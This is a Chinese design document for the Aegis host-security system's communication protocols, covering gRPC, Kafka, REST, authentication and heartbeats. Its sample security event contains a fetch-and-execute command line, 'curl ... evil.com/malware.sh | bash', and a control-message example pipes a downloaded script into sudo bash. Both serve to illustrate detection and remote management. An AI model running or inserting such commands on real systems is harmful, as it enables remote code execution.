# Aegis智能主机安全系统 V5.5 通信协议设计文档

**版本**: 5.5
**日期**: 2026-03-30
**状态**: 定稿

---

## 1. 通信架构概述

V5.5版本采用微服务架构，服务间通信更加规范和高效。主要通信模式：

| 通信路径 | 协议 | 端口 | 用途 |
|---------|------|------|------|
| Frontend → API Server | HTTP/WebSocket | 8082 | 用户请求、实时推送 |
| Server → Agent | gRPC (双向流) | 19090 | 事件上报、命令下发 |
| API Server → Server | gRPC | 19094 | 命令下发、状态查询 |
| Server → DC | Kafka | - | 事件转发 |
| DC → Server | Kafka | - | 阻断命令 |

---

## 2. gRPC通信协议

### 2.1 Protobuf定义

```protobuf
// proto/agent_comm.proto
syntax = "proto3";

package aegis;

option go_package = "aegis-system/pkg/api/v1";

// ========== Agent → Backend 消息 ==========

message AgentMessage {
    oneof message {
        RegisterRequest register = 1;
        HeartbeatRequest heartbeat = 2;
        RuntimeEvent event = 3;
        CommandResult result = 4;
    }
}

// 注册请求
message RegisterRequest {
    string agent_id = 1;
    string hostname = 2;
    string ip_address = 3;
    string os_type = 4;
    string os_version = 5;
    string agent_version = 6;
    repeated string capabilities = 7;
}

// 心跳请求
message HeartbeatRequest {
    string agent_id = 1;
    SystemMetrics metrics = 2;
}

// 系统指标
message SystemMetrics {
    uint32 cpu_percent = 1;
    uint32 memory_mb = 2;
    uint32 event_count = 3;
}

// 运行时事件
message RuntimeEvent {
    string event_id = 1;
    string host_id = 2;
    string event_type = 3;
    int64 timestamp = 4;
    uint32 pid = 5;
    uint32 ppid = 6;
    uint32 uid = 7;
    string process_name = 8;
    string command_line = 9;
    string parent_name = 10;
    string working_dir = 11;
    string mitre_id = 12;
}

// 命令执行结果
message CommandResult {
    string task_id = 1;
    string agent_id = 2;
    int32 exit_code = 3;
    string stdout = 4;
    string stderr = 5;
    bool timeout = 6;
    int64 duration_ms = 7;
}

// ========== Backend → Agent 消息 ==========

message ServerMessage {
    oneof message {
        Ack ack = 1;
        CommandExecute command = 2;
        BlockPolicyUpdate block_policy = 3;
        ConfigUpdate config = 4;
    }
}

// 确认消息
message Ack {
    string status = 1;
    string message = 2;
}

// 命令执行请求
message CommandExecute {
    string task_id = 1;
    string command = 2;
    int64 timeout_seconds = 3;
    map<string, string> env = 4;
}

// 阻断策略更新
message BlockPolicyUpdate {
    string mitre_id = 1;
    string action = 2;          // "block" or "unblock"
    string block_method = 3;    // "kill_process", "kill_parent", "quarantine"
    bool enabled = 4;
}

// 配置更新
message ConfigUpdate {
    string config_key = 1;
    string config_value = 2;
    int64 version = 3;
}

// ========== 流服务定义 ==========

service AgentComm {
    // Agent流: Agent上报事件、接收命令
    rpc AgentStream(stream AgentMessage) returns (stream ServerMessage);
    
    // 接收来自后端的命令
    rpc ServerStream(ServerStreamRequest) returns (stream ServerMessage);
    
    // 健康检查
    rpc Check(HealthCheckRequest) returns (HealthCheckResponse);
}

// 请求定义
message ServerStreamRequest {
    string agent_id = 1;
}

message HealthCheckRequest {}

message HealthCheckResponse {
    enum ServingStatus {
        UNKNOWN = 0;
        SERVING = 1;
        NOT_SERVING = 2;
    }
    ServingStatus status = 1;
}
```

---

## 3. Kafka消息协议

### 3.1 主题定义

| 主题 | 用途 | 生产者 | 消费者 |
|------|------|--------|--------|
| aegis.security.events | 安全事件流 | Agent Hub | Pipeline Service |
| aegis.control | 控制命令 | Pipeline Service | Agent Hub |
| aegis.block.policy | 阻断策略变更 | API Service | ALL |

### 3.2 事件消息格式

```json
// aegis.security.events 消息格式
{
    "event_id": "evt_abc123",
    "host_id": "host_xyz789",
    "event_type": "execve",
    "timestamp": 1709284800000,
    "pid": 1234,
    "ppid": 1100,
    "uid": 0,
    "process_name": "/bin/bash",
    "command_line": "curl -sSL http://evil.com/malware.sh | bash",
    "parent_name": "/usr/bin/ssh",
    "mitre_id": "T1059",
    "priority": 0,
    "decision": "BLOCK",
    "is_blocked": true,
    "blocked_by": "local"
}
```

```json
// aegis.control 消息格式
{
    "message_type": "command_execute",
    "task_id": "task_def456",
    "agent_id": "host_xyz789",
    "command": "curl -sSL http://server/template.sh | sudo bash",
    "timeout_seconds": 300,
    "created_at": 1709284800000
}
```

```json
// aegis.block.policy 消息格式
{
    "message_type": "block_policy_update",
    "mitre_id": "T1059",
    "action": "block",
    "block_method": "kill_process",
    "enabled": true,
    "updated_at": 1709284800000,
    "updated_by": "admin"
}
```

---

## 4. HTTP API协议

### 4.1 API服务端口

| 服务 | 端口 | 协议 |
|------|------|------|
| API Service | 8080 | HTTP |
| Agent Hub | 19090 | gRPC |
| Pipeline Service | 19091 | gRPC (内部) |

### 4.2 REST API端点

```yaml
# API Service HTTP端点

/api/v1:
  # 认证
  POST /auth/login
  POST /auth/logout
  GET  /auth/me

  # 主机管理
  GET    /hosts
  GET    /hosts/:id
  GET    /hosts/:id/status
  
  # 规则管理
  GET    /detection/rules
  POST   /detection/rules
  PUT    /detection/rules/:id
  DELETE /detection/rules
  
  # 告警管理
  GET    /detection/alerts
  POST   /detection/alerts/:id/resolve
  POST   /detection/alerts/:id/block
  DELETE /detection/alerts
  
  # 阻断策略
  GET    /detection/block-policies
  PUT    /detection/block-policies/:mitre_id
  POST   /detection/block-policies/sync
  
  # LLM分析
  POST   /detection/llm/aggregate
  GET    /detection/llm/aggregate/:id
  
  # Agent管理
  GET    /api/v1/agents
  GET    /api/v1/agents/:id/status
  POST   /api/v1/agents/:id/command
  
  # 任务管理
  GET    /tasks
  POST   /tasks/run-check
  POST   /tasks/run-fix
  
  # 系统配置
  GET    /config/llm
  POST   /config/llm
  POST   /config/llm/test
```

### 4.3 WebSocket端点

```yaml
# WebSocket实时推送
WS /api/v1/detection/runtime/ws

# 消息格式
{
    "type": "alert_new" | "alert_update" | "agent_status" | "task_update",
    "data": { ... },
    "timestamp": 1709284800000
}
```

---

## 5. 服务间通信

### 5.1 API Service → Agent Hub

通过gRPC调用:

```go
type AgentHubClient interface {
    ExecuteCommand(ctx context.Context, req *ExecuteCommandRequest) (*ExecuteCommandResponse, error)
    GetAgentStatus(ctx context.Context, agentID string) (*AgentStatusResponse, error)
    GetAgentList(ctx context.Context) (*AgentListResponse, error)
}
```

### 5.2 Agent Hub ↔ Pipeline Service

通过Kafka异步通信:

```
Agent Hub (Producer) → Kafka Topic: aegis.security.events → Pipeline Service (Consumer)
```

### 5.3 Pipeline Service → API Service

通过数据库共享或gRPC:

```
Pipeline Service:
  - 写入 alerts 表
  - 发布 WebSocket 消息

API Service:
  - 读取 alerts 表
  - 推送 WebSocket 到前端
```

---

## 6. 安全协议

### 6.1 认证机制

| 通信路径 | 认证方式 |
|---------|---------|
| Agent → Agent Hub | Token (gRPC Metadata) |
| API Service → Agent Hub | Service Token |
| Frontend → API Service | JWT Token |

### 6.2 传输加密

- gRPC: TLS 1.3
- HTTP: TLS 1.2
- Kafka: SASL_SSL

### 6.3 Token配置

```toml
# Agent配置
[server]
auth_token = "agent_token_xxx"

# Backend配置
[auth]
jwt_secret = "jwt_secret_xxx"
service_token = "service_token_xxx"
```

---

## 7. 通信超时与重试

### 7.1 超时配置

| 操作 | 超时 |
|------|------|
| Agent注册 | 10s |
| 心跳 | 5s |
| 命令下发 | 30s |
| LLM分析 | 60s |

### 7.2 重试策略

| 场景 | 重试次数 | 退避策略 |
|------|---------|---------|
| 网络断开 | 无限 | 指数退避 (5s → 10s → 30s → 5m) |
| gRPC调用失败 | 3次 | 固定退避 (1s) |
| Kafka发送失败 | 10次 | 指数退避 |

---

## 8. 心跳协议

### 8.1 心跳间隔

- **Agent发送间隔**: 30秒
- **Backend超时判定**: 90秒 (3次心跳未收到)

### 8.2 心跳消息格式

```json
// Agent → Backend
{
    "type": "heartbeat",
    "agent_id": "host_xyz789",
    "timestamp": 1709284800000,
    "metrics": {
        "cpu_percent": 10,
        "memory_mb": 80,
        "event_count": 1000
    },
    "status": "online"
}
```

```json
// Backend → Agent (响应)
{
    "type": "heartbeat_ack",
    "server_time": 1709284800000,
    "config_version": 15,
    "block_policy_version": 8
}
```

---

**文档结束**